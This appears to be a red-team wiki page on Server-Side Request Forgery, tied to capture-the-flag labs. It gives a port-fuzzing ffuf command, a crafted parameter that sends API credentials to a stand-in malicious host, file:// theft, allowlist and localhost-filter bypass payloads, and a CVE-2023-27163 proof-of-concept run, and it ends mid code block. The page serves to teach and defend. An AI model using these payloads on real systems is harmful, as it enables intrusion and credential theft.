<div class="row row-cols-lg-2"><div>

Server-Side Request Forgery (SSRF) is an attack in which a hacker can make a server request something from another server, usually an internal server or an API.

From instance, a website using an API. If there is a SSRF vulnerability, the hacker may be able to query the API by exploiting the website.

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms <small>(internal API calls)</small>
* üç™ Cookies
* üåç Remote connections <small>(imports, file processing, etc.)</small>
</div><div>

Common usages are:

* Port mapping
* Firewall by-pass
* Steal sensitive data

There are two kinds of SSRF

* **Regular/in-band SSRF**: the client will see the result
* **Blind/out-band SSRF**: nothing is returned to the client

Refer to [request grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch requests.

## SSRF Attack Vectors

<div class="row row-cols-lg-2"><div>

#### Remote URL Access

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

The most common scenario is when a website requests an external resources using user input, such as an external avatar URL.

A common scenario is a [PHP](/programming-languages/web/php/_general/index.md) call to `file_get_contents` to access a remote file. You have similar functions in other languages.

You may be able to:

* Map ports/services üó∫Ô∏è
* Steal files üí∞

#### Remote API Endpoint Access

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

If a website is making a request to an external API based on a endpoint controlled by the user, we may be able to access another unintended endpoint. Ex: `website.a/?api=path` $\to$ `website.b/path`.

You may be able to:

* Access unintended API endpoints üõ£Ô∏è
</div><div>

#### Remote API Access

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

If the programmer is using user input to determine which server will be queried, then the hacker may try to send the request to their servers instead, and get the API credentials inside the headers.

Ex: `a?api=xxx&r=path` $\to$ `xxx.b/path`

* We send the request to `https://xxx.thebestapi.example/path`
* If `api=malicious_website.com?&ignore=`, then the URL crafted is `https://malicious_website.com?&ignore=.thebestapi.com/path`!

You may be able to:

* Steal API tokens/credentials üíµ

#### Mapping ports/services üó∫Ô∏è

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

You may inject URLs such as `http://localhost:22` to test if the port `22` is open. You can use fuzzing to enumerate all ports:

```ps
$ seq 1 65535 > ports.txt
$ ffuf -w ports.txt -u 'http://IP/?xxx=http://127.0.0.1:FUZZ' -fr 'Connection refused'
```

You could also make the server call `http://ifconfig.pro/` to get some information <small>(IP, DNS...)</small> to perform more advanced attacks.

#### Steal files üí∞

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

You may inject URLs to steal a file. For instance, a URL using the file protocol: `file://some/file/on/the/target`.

* [List of interesting files](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md)
* You could also try to connect to your FTP server using `ftp://`.

## Mitigations üõ°Ô∏è

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

<div class="row row-cols-lg-2"><div>

**Allow List/Whitelist**

We define what is allowed such as which URLs/resources. It can be bypassed. If there is a condition like `the URL must start with https://example.com`, then it can be bypassed with:

* `https://example.com.malicious.website`
* `https://example.com@malicious.website`
</div><div>

**Deny list/Blacklist**

You may allow every IP aside from some such as localhost <small>(127.0.0.1)</small>, or `169.254.169.254` in a cloud environment, but there are usually a lot of ways to bypass such filters. 

All of these are resolving to `127.0.0.1`:

*  `0`, `00`, `000[...]0`, `0.0.0.0`, `127.1` (IP shortening)
* `2130706433` (decimal), `017700000001` (octal)
* [127.0.0.1.nip.io](http://127.0.0.1.nip.io), [localtest.me](http://localtest.me), [lvh.me](http://lvh.me), etc.
* ...

#### CVE-2023-27163

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

CVE in [request-baskets](https://github.com/darklynx/request-baskets). [POC (shell script)](https://github.com/entr0pie/CVE-2023-27163) <small>(0.03k ‚≠ê)</small>.

```shell!
$ ./CVE-2023-27163.sh http://target:port http://listener:port 
Creating the "<backet>" proxy basket...
Basket created!
$ curl http://target:port/<backet> # sent to listener URL
```

It can be used to access a resource behind a firewall.

```ps
